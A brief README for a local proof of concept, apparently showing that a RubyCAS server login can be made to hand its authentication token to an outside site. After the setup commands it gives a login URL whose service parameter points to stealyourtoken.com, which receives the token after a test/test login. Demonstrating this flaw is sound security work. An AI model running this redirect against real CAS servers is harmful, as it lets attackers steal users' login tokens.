# XSS POC

Open the client folder in a terminal and run `bundle` than enter `rackup`.

In another terminal go to the server folder and run `bundle` than enter `bundle exec rubycas-server -c config.yml`.

Open `http://localhost:7777/login?service=http://stealyourtoken.com` in a browser and login with test/test. It will redirect you to `stealyourtoken.com` with your token.